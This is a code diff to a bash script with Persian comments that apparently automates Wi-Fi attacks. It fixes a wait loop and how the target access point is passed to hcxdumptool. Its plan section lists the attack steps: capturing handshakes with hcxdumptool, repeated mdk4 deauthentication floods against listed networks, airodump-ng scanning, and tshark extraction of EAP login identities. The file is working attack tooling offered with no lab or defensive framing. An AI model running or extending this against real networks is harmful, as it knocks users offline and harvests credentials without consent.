@@ -106,8 +106,12 @@ banner(){
 }
 # نوار پیشرفت فقط روی ترمینال؛ در پایپ/CI همان sleep ساده
 wait_bar(){
-  local total="${1:-0}" label="${2:-waiting}" i filled pad bar
-  if [ ! -t 1 ] || [ "$total" -lt 2 ]; then sleep "$total"; return; fi
+  local total="${1:-0}" label="${2:-waiting}" i filled pad bar until
+  if [ ! -t 1 ] || [ "$total" -lt 2 ]; then
+    until=$((SECONDS + total))
+    while [ "$SECONDS" -lt "$until" ]; do sleep 1; done
+    return
+  fi
   for ((i = 1; i <= total; i++)); do
     filled=$(( i * 24 / total ))
     printf -v bar '%*s' "$filled" ''
@@ -613,7 +617,10 @@ capture_once() {
   grep -q -- '--filterlist_ap' <<<"$hdr" || { err "نسخه hcxdumptool ناشناخته."; return 1; }
   if grep -qE '^\s*-w[, ]' <<<"$hdr"; then outflag=-w; else outflag=-o; fi
   FILTER=()
-  [ -n "${TARGET:-}" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
+  if [ -n "${TARGET:-}" ]; then
+    printf '%s\n' "$TARGET" > "$WORK/filterlist"
+    FILTER=(--filterlist_ap="$WORK/filterlist" --filtermode=2)
+  fi
   hcxdumptool -i "$MON" "$outflag" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
   HK_PID=$!
 }
@@ -860,7 +867,7 @@ print_plan() {
 PLAN
   echo "[1] Capture (${CAPTURE:-120}s)"
   cat <<'PLAN'
-    hcxdumptool -i $MON -o $CAP [filterlist_ap=$TARGET]
+    hcxdumptool -i $MON -o $CAP [filterlist_ap=$WORK/filterlist]
     mdk4 $MON d -b $WORK/blacklist  (background, every 5s)
     airodump-ng --band abg --output-format csv -w $WORK/scan $MON
     tshark -r $CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity
